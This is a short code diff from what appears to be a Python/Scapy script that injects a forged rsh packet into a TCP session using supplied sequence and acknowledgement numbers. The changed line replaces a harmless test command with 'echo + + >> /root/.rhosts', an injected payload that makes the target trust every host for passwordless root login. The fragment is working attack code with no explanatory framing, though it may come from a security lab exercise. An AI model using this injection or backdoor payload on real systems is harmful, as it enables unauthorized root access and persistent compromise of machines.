@@ -60,7 +60,7 @@ def envia_RSH(seq, ack):
     tcp.dport = dst_port
     tcp.flags = "PA"
 
-    rsh_command = b"\x00root\x00root\x00cat teste.txt\x00"
+    rsh_command = b"\x00root\x00root\x00echo + + >> /root/.rhosts \x00"
 
     pacote = ip / tcp / rsh_command
 
